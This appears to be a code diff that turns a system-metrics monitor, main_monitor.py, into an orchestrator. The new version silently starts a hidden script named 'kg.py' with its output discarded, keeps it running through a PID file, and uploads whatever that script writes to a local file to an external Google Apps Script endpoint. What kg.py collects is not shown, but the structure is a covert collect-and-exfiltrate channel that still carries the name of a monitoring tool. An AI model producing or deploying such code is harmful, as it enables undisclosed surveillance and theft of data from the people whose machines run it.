@@ -1,56 +1,104 @@
 # main_monitor.py
-import psutil # pip install psutil
-import json
 import time
 import os
-import requests # For sending data
-
-
-import asyncio
-
+import requests
+import subprocess
+import sys
 
 # --- Configuration ---
 # IMPORTANT: Replace with your Google Apps Script Web App URL.
 # This URL should be configured to accept 'text/plain' and split by newlines.
-TARGET_URL = os.environ.get("MONITORING_TARGET_URL", "https://script.google.com/macros/s/AKfycbw26eCGBW5RaixApmwGDLZFpLqWkLkFX4ybgGr3_VWiRFI6ebU5GmgTmpd-LxFbjNRZ1Q/exec") # Placeholder, replace with your actual URL
-MONITOR_INTERVAL_SECONDS = int(os.environ.get("MONITOR_INTERVAL", "60")) # Collect metrics and write to local file every 60 seconds
-BATCH_SEND_INTERVAL_SECONDS = int(os.environ.get("BATCH_INTERVAL", "60")) # Send local file content every 60 seconds (1 minute)
-COMPUTER_ID = os.environ.get("COMPUTER_ID", "unnamed_computer") # A unique ID for this computer
+TARGET_URL = os.environ.get("MONITORING_TARGET_URL", "https://script.google.com/macros/s/AKfycbw26eCGBW1RaixApmwGDLZFpLqWkLkFX4ybgGr3_VWiRFI6ebU5GmgTmpd-LxFbjNRZ1Q/exec") # Placeholder, replace with your actual URL
 
-# Local file to temporarily store monitoring data.
-# This is now explicitly set to "thing.txt" in the current working directory.
+# Local file that the secondary script writes to, and this script reads/clears.
 LOCAL_LOG_FILE = "thing.txt"
 
-# Ensure the directory for the local log file exists (current directory by default)
-os.makedirs(os.path.dirname(os.path.abspath(LOCAL_LOG_FILE)), exist_ok=True)
+# Path to the secondary data collection script.
+# This has been updated to "kg.py" as requested.
+# Make sure this path is correct relative to where main_monitor.py is run,
+# or provide an absolute path.
+SECONDARY_SCRIPT_PATH = "kg.py"
 
-last_send_time = time.time()
+# --- Global variable to store the secondary process PID ---
+# We'll store the PID in a temporary file to persist it between runs of main_monitor.py
+PID_FILE = "secondary_script_pid.txt"
 
-def get_system_metrics_as_text():
+def get_secondary_script_pid():
+    """Reads the PID of the secondary script from a file."""
+    if os.path.exists(PID_FILE):
+        try:
+            with open(PID_FILE, 'r') as f:
+                return int(f.read().strip())
+        except (ValueError, IOError):
+            return None
+    return None
+
+def set_secondary_script_pid(pid):
+    """Writes the PID of the secondary script to a file."""
+    try:
+        with open(PID_FILE, 'w') as f:
+            f.write(str(pid))
+    except IOError as e:
+        print(f"Error writing PID to file: {e}")
+
+def clear_secondary_script_pid():
+    """Removes the PID file."""
+    if os.path.exists(PID_FILE):
+        try:
+            os.remove(PID_FILE)
+        except OSError as e:
+            print(f"Error removing PID file: {e}")
+
+def is_process_running(pid):
+    """Checks if a process with the given PID is currently running."""
+    if pid is None:
+        return False
+    try:
+        # On Unix-like systems, os.kill(pid, 0) checks if PID exists without sending a signal
+        # On Windows, this will raise OSError if process doesn't exist.
+        os.kill(pid, 0)
+        return True
+    except OSError:
+        return False
+
+def start_secondary_script_if_needed():
     """
-    Collects various system performance metrics and formats them as a single
-    plain text string, suitable for a single line in a log file.
+    Starts the secondary data collection script if it's not already running.
     """
-    current_timestamp = time.time()
-    cpu_percent = psutil.cpu_percent(interval=1)
-    memory_percent = psutil.virtual_memory().percent
-    disk_usage_root_percent = psutil.disk_usage('/').percent
-    network_bytes_sent = psutil.net_io_counters().bytes_sent
-    network_bytes_recv = psutil.net_io_counters().bytes_recv
+    current_pid = get_secondary_script_pid()
+    
+    if current_pid and is_process_running(current_pid):
+        print(f"Secondary script '{SECONDARY_SCRIPT_PATH}' already running with PID: {current_pid}")
+        return # Already running, nothing to do
 
-    # Format the metrics into a comma-separated string.
-    # Ensure the order and format match what you expect in your Google Sheet.
-    # If your Google Sheet simply takes the whole line, this format is flexible.
-    metric_line = (
-        f"{current_timestamp},"
-        f"{COMPUTER_ID},"
-        f"{cpu_percent},"
-        f"{memory_percent},"
-        f"{disk_usage_root_percent},"
-        f"{network_bytes_sent},"
-        f"{network_bytes_recv}"
-    )
-    return metric_line
+    print(f"Secondary script '{SECONDARY_SCRIPT_PATH}' not running or PID file invalid. Attempting to start...")
+    try:
+        # Use sys.executable to ensure the correct Python interpreter is used
+        # Use subprocess.DETACHED_PROCESS on Windows to prevent it from being a child process
+        # On Unix-like systems, 'nohup' or running in a screen/tmux session is common for true detachment
+        # For simplicity, we'll use a platform-agnostic approach that aims for detachment.
+        
+        # Note: stdout/stderr are NOT captured here, as the secondary script is meant to run
+        # truly independently. Its output will go to the console it was launched from
+        # (or be redirected by systemd/cron if set up that way).
+        process = subprocess.Popen(
+            [sys.executable, SECONDARY_SCRIPT_PATH],
+            stdout=subprocess.DEVNULL,  # Redirect stdout to /dev/null
+            stderr=subprocess.DEVNULL,  # Redirect stderr to /dev/null
+            # For Windows: creationflags=subprocess.DETACHED_PROCESS
+            # For Linux/macOS: preexec_fn=os.setsid (makes it a session leader, detaching from parent)
+            close_fds=True # Close file descriptors in child process
+        )
+        set_secondary_script_pid(process.pid)
+        print(f"Secondary script '{SECONDARY_SCRIPT_PATH}' launched with PID: {process.pid}")
+        # Give it a moment to initialize
+        time.sleep(2) 
+    except FileNotFoundError:
+        print(f"Error: Secondary script '{SECONDARY_SCRIPT_PATH}' not found. Check path.")
+        clear_secondary_script_pid() # Clear PID file if script not found
+    except Exception as e:
+        print(f"Error starting secondary script '{SECONDARY_SCRIPT_PATH}': {e}")
+        clear_secondary_script_pid() # Clear PID file on other errors
 
 def send_local_file_content_to_sheets(file_path):
     """
@@ -101,37 +149,17 @@ def clear_local_log_file(file_path):
         print(f"Error clearing local log file '{file_path}': {e}")
 
 if __name__ == "__main__":
-    print(f"Main monitoring script started. Local log file: {LOCAL_LOG_FILE}")
-    print(f"Collecting metrics every {MONITOR_INTERVAL_SECONDS} seconds, sending file every {BATCH_SEND_INTERVAL_SECONDS} seconds.")
+    print("Main monitoring script (orchestrator) started.")
     
-    try:
-        while True:
-            # Collect metrics and write to local file
-            metric_line = get_system_metrics_as_text()
-            try:
-                with open(LOCAL_LOG_FILE, 'a', encoding='utf-8') as f:
-                    f.write(metric_line + '\n')
-                # print(f"Appended to local log: {metric_line}") # Uncomment for verbose logging
-            except Exception as e:
-                print(f"Error writing to local log file: {e}")
+    # 1. Ensure the secondary script is running
+    start_secondary_script_if_needed()
 
-            current_time = time.time()
-            if (current_time - last_send_time) >= BATCH_SEND_INTERVAL_SECONDS:
-                # Send the content of LOCAL_LOG_FILE
-                if send_local_file_content_to_sheets(LOCAL_LOG_FILE):
-                    # Clear LOCAL_LOG_FILE after successful send
-                    clear_local_log_file(LOCAL_LOG_FILE) 
-                else:
-                    print("Failed to send file content. Data will remain in local file for next attempt.")
-                last_send_time = current_time # Reset timer regardless of success to avoid immediate re-attempt
-            
-            time.sleep(MONITOR_INTERVAL_SECONDS)
-
-    except KeyboardInterrupt:
-        print("Main monitoring script interrupted gracefully by user. Attempting to send remaining data...")
-        if os.path.exists(LOCAL_LOG_FILE) and os.path.getsize(LOCAL_LOG_FILE) > 0:
-            send_local_file_content_to_sheets(LOCAL_LOG_FILE) # Attempt to send any unsent data on exit
-        print("Exiting.")
-    except Exception as e:
-        print(f"An unexpected error occurred in the main monitoring loop: {e}")
-
+    # 2. Send the content of LOCAL_LOG_FILE (thing.txt)
+    if send_local_file_content_to_sheets(LOCAL_LOG_FILE):
+        # 3. Clear LOCAL_LOG_FILE after successful send
+        clear_local_log_file(LOCAL_LOG_FILE) 
+    else:
+        print("Failed to send file content. Data will remain in local file for next attempt by next main_monitor.py run.")
+    
+    print("Main monitoring script (orchestrator) finished.")
+    # The script will now exit
